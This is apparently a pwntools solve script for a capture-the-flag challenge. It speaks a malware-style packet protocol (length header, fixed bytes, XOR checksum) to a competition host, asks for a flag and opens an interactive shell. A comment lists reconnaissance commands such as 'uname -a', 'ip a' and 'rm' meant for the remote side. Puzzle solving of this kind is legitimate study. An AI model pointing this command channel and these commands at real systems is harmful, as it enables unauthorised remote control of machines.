from pwn import *

def send_packet(data, res=""):
	_len = len(data) + 10
	rand = '\x12' * 8
	packet = rand + data + '\x00'
	checksum = 0
	for i in rand:
		checksum ^= ord(i)
	for i in data:
		checksum ^= ord(i)
	packet += chr(checksum)
	r.send(p32(_len))
	r.send(packet + res)

def recv_packet():
	_len = u32(r.recv(4))
	data = r.recv(_len)[8:-1]
	print data

r = remote("mlwr-part1.ctfcompetition.com", 4242)

'''
len + rand + data + checksum
'''

'''
echo $USER
hostname
uname -a
ip a
rm
'''
send_packet("part1 flag")
recv_packet()

r.interactive()
